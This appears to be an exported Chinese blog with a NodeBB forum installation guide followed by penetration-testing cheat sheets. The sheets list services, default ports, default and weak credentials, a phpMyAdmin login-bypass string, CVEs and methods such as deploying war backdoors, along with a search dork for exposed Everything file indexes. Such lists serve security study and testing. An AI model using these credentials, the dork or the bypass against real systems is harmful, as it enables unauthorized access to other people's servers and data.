<h2 id="1-更新源，关防火墙"><a href="#1-更新源，关防火墙" class="headerlink" title="1.更新源，关防火墙"></a>1.更新源，关防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum -y update</span><br><span class="line">$ yum -y install epel-release</span><br><span class="line">$ yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">$ yum -y install git ImageMagick ImageMagick-devel</span><br><span class="line"></span><br><span class="line">查看防火墙状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line">停止firewall</span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">禁止firewall开机启动</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>
<h2 id="2-NODEJS安装"><a href="#2-NODEJS安装" class="headerlink" title="2.NODEJS安装"></a>2.NODEJS安装</h2><p>安装NVM</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash</span><br></pre></td></tr></table></figure>
<p>使环境变量的修改生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ source ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>检查是否成功安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ command -v nvm</span><br></pre></td></tr></table></figure>
<p>让NVM使用淘宝源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node</span><br><span class="line">$ export NVM_IOJS_ORG_MIRROR=http://npm.taobao.org/mirrors/iojs</span><br></pre></td></tr></table></figure>
<p>安装Node.js LTS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nvm install --lts</span><br></pre></td></tr></table></figure>
<p>查看是否搭建nodejs成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ node -v &amp;&amp; npm -v</span><br></pre></td></tr></table></figure>
<p>npm更换为cnpm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<h2 id="3-MONGODB安装"><a href="#3-MONGODB安装" class="headerlink" title="3.MONGODB安装"></a>3.MONGODB安装</h2><p>配置 MongoDB yum 源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/yum.repos.d/mongodb-org-4.0.repo</span><br></pre></td></tr></table></figure>
<p>把下面的内容复制进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mongodb-org-4.0] </span><br><span class="line">name = MongoDB Repository </span><br><span class="line">baseurl = https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.0/x86_64/ </span><br><span class="line">gpgcheck = 1 </span><br><span class="line">enabled = 1 </span><br><span class="line">gpgkey = https://www.mongodb.org/static/pgp/server-4.0.asc</span><br></pre></td></tr></table></figure>
<p>更新文件，安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum update</span><br><span class="line">$ yum -y install mongodb-org</span><br></pre></td></tr></table></figure>
<p>查看 Mongodb 版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongod --version</span><br><span class="line">请检查你的 MongoDB 版本是否大于或等于3.4.10，如果不是请立即升级（以前的版本存在严重的安全风险）！</span><br></pre></td></tr></table></figure>
<p>安装完成后，为了消除 MongoDB 的性能警告，需要关闭 Linux 巨型页：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line">$ echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br></pre></td></tr></table></figure>
<p>启动 MongoDB 服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service mongod start</span><br></pre></td></tr></table></figure>
<p>新建数据库配置(详细可查看 配置MongoDB 篇)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br></pre></td></tr></table></figure>
<p>新建数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use nodebb # 新建数据库，名叫 nodebb</span><br></pre></td></tr></table></figure>
<p>添加用户角色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.createUser( &#123; user: &quot;nodebb&quot;, pwd: &quot;nodebbpassword&quot;, roles: [ &quot;readWrite&quot; ] &#125; )</span><br></pre></td></tr></table></figure>
<p>如果要在NodeBB的管理控制面板（高级→数据库）中查看数据库统计信息，请键入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.grantRolesToUser(&quot;nodebb5&quot;,[&#123; role: &quot;clusterMonitor&quot;, db: &quot;admin&quot; &#125;]);</span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure>
<p>打开 MongoDB 权限认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/mongod.conf</span><br></pre></td></tr></table></figure>
<p>找到 security: 这一行，取消注释并改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security:</span><br><span class="line">   authorization: enabled</span><br></pre></td></tr></table></figure>

<p>重启 MongodB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service mongod restart</span><br></pre></td></tr></table></figure>
<h2 id="4-NODEBB安装"><a href="#4-NODEBB安装" class="headerlink" title="4.NODEBB安装"></a>4.NODEBB安装</h2><p>下载 NodeBB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd /home #切换到你想要的位置即可</span><br><span class="line">$ git clone -b v1.12.x https://gitee.com/qiai365/NodeBB.git nodebb</span><br></pre></td></tr></table></figure>
<p>进入目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd /home/nodebb</span><br></pre></td></tr></table></figure>
<p>初始化 NodeBB，使用如下命令开始初始化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cnpm install</span><br><span class="line">$ cnpm install sharp</span><br><span class="line">$ ./nodebb setup</span><br><span class="line">$ cnpm install --production</span><br><span class="line">$ ./nodebb setup</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./nodebb dev</span><br></pre></td></tr></table></figure>
<p>如果都没报错的话可以使用下面的命令启动程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./nodebb start</span><br></pre></td></tr></table></figure>
<h2 id="5-NGINX安装"><a href="#5-NGINX安装" class="headerlink" title="5.NGINX安装"></a>5.NGINX安装</h2><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/yum.repos.d/nginx.repo</span><br></pre></td></tr></table></figure>

<p>在文件内写入以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/rhel/$releasever/x86_64/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>
<p>开始安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ yum -y install nginx.x86_64</span><br></pre></td></tr></table></figure>

<p>配置 Nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<p>在 http 语句块内追加上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line"></span><br><span class="line">    server_name www.xxx.com;   #你的域名</span><br><span class="line"></span><br><span class="line">   location / &#123;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-NginX-Proxy true;</span><br><span class="line"></span><br><span class="line">        proxy_pass http://127.0.0.1:4567;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line"></span><br><span class="line">        # Socket.IO Support</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>启动 Nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service nginx start</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./nodebb start</span><br></pre></td></tr></table></figure>

<p>现在你就可以通过访问你的域名来进入nodebb论坛程序了！</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>关于反向代理注意点：</p>
<p>问：在/etc/nginx/nginx.conf填上配置信息后，为什么直接访问域名还是nginx欢迎页面？</p>
<p>答：在/etc/nginx/nginx.conf中除了自己填写的server配置之外，还有一个关注点，那就是在http语句块中<br>include /etc/nginx/conf.d/*.conf这个不起眼的包含语句是致命的，这一句话会将/etc/nginx/conf.d/目录<br>下的一个默认配置default.conf优先处理，而这个默认的default.conf，正好是监听80端口。因为这个问题，我重置<br>了不下5遍服务器重新搭建。然后还是花了一天时间把nginx的官方文档看了一遍才知道的。<br>有人会说百度啊，谷歌啊啥的我咋没搜了，我搜了！但是人家仅仅只会说一句端口占用之类的话，而这个配置导致的问题<br>并不是端口占用，因为nginx不会同时加载这两个（/etc/nginx/nginx.conf、/etc/nginx/conf.d/default.conf），default的优先级更高！<br>所以没查出来端口占用！</p>
<h2 id="高级管理"><a href="#高级管理" class="headerlink" title="高级管理"></a>高级管理</h2><p>安装 forever维持进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cnpm install forever -g # 这里必须加-g参数，不然可能装不上</span><br></pre></td></tr></table></figure>

<p>后台启动 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever start app.js</span><br></pre></td></tr></table></figure>

<p>停止 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever stop app.js</span><br></pre></td></tr></table></figure>

<p>查看后台的 NodeBB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ forever list</span><br></pre></td></tr></table></figure>
<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>关于nodebb我觉得非常好的东西：</p>
<ol>
<li>markdown编辑器，这是一个每个人都需要会的东西，极度轻简的编辑器带动着宇宙万物。markdown的使用语法，后续会由胖胖Bolooo2_7发出来。</li>
<li>socket.io，socket.io是基于WebSocket的C-S实时通信库，这个东西带动着我们现在论坛的实时聊天和几乎无延迟的消息队列，不信你可以打开一个人的头像发消息给他就知道了，比QQ的速度还要快。更重要的是，安全！！！所有的流量请求均通过WebSocket实现的，什么？抓包改包？你抓一个试试！</li>
<li>颜值，好看就完事了</li>
<li>其他的暂时还没想起来，想起来再补吧</li>
</ol>
]]></content>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Everything目录遍历</title>
    <url>/2019/05/26/Everything%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<p>谷歌语法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:Diagnostics/index</span><br></pre></td></tr></table></figure><a id="more"></a>

<p><img src="https://i.loli.net/2019/11/11/o8SYn6mCVTlRs19.png" alt="72038090-1f57-4688-9c69-dd709808be46-image.png"></p>
<p>点进去，可以看到所有的东西，注意！是所有的！包括管理员权限的文件</p>
<p><img src="https://i.loli.net/2019/11/11/iEvgaA1hzNDkHmw.png" alt="9f054c68-044f-4447-968f-adb75e42ded8-image.png"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>（三）渗透技巧—数据库、缓存、消息服务</title>
    <url>/2019/04/15/%EF%BC%88%E4%B8%89%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E3%80%81%E6%B6%88%E6%81%AF%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、MySQL数据库"><a href="#1、MySQL数据库" class="headerlink" title="1、MySQL数据库"></a>1、MySQL数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：3306</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   身份认证漏洞：CVE-2012-2122</span><br><span class="line">•   拒绝服务攻击</span><br><span class="line">•   Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</span><br><span class="line">•   提权</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.seebug.org/appdir/MySQL</span><br><span class="line">http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390</span><br><span class="line">https://xz.aliyun.com/t/1491</span><br></pre></td></tr></table></figure>
<h3 id="2、MSSQL数据库"><a href="#2、MSSQL数据库" class="headerlink" title="2、MSSQL数据库"></a>2、MSSQL数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令/使用系统用户</span><br><span class="line">•   注入</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.anquanke.com/post/id/86011</span><br></pre></td></tr></table></figure>
<h3 id="3、Oracle数据库"><a href="#3、Oracle数据库" class="headerlink" title="3、Oracle数据库"></a>3、Oracle数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   注入攻击</span><br><span class="line">•   漏洞攻击</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</span><br></pre></td></tr></table></figure>

<h3 id="4、PostgreSQL数据库"><a href="#4、PostgreSQL数据库" class="headerlink" title="4、PostgreSQL数据库"></a>4、PostgreSQL数据库</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：5432</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令：postgres postgres</span><br><span class="line">•   缓冲区溢出：CVE-2014-2669</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://drops.xmd5.com/static/drops/tips-6449.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/69153.html</span><br></pre></td></tr></table></figure>
<h3 id="5、MongoDB数据库"><a href="#5、MongoDB数据库" class="headerlink" title="5、MongoDB数据库"></a>5、MongoDB数据库</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：27017</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问；github有攻击代码；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.cnblogs.com/LittleHann/p/6252421.html</span><br><span class="line"></span><br><span class="line">http://www.tiejiang.org/19157.html</span><br></pre></td></tr></table></figure>
<h3 id="6、Redis数据库"><a href="#6、Redis数据库" class="headerlink" title="6、Redis数据库"></a>6、Redis数据库</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br><span class="line">•   未授权访问+配合ssh key提权</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.alloyteam.com/2017/07/12910/</span><br></pre></td></tr></table></figure>
<h3 id="7、SysBase数据库"><a href="#7、SysBase数据库" class="headerlink" title="7、SysBase数据库"></a>7、SysBase数据库</h3><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击方法：</span><br><span class="line">•   爆破：弱口令</span><br></pre></td></tr></table></figure>
<h3 id="8、DB2-数据库"><a href="#8、DB2-数据库" class="headerlink" title="8、DB2 数据库"></a>8、DB2 数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：5000</span><br><span class="line">攻击方法：</span><br><span class="line">•   安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</span><br><span class="line">参考：</span><br><span class="line">http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</span><br></pre></td></tr></table></figure>































]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（一）渗透技巧—web</title>
    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>














]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>（五）渗透技巧—云环境</title>
    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>文章不记得从哪个公众号上拉下来的了</p>
</blockquote><a id="more"></a>
<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
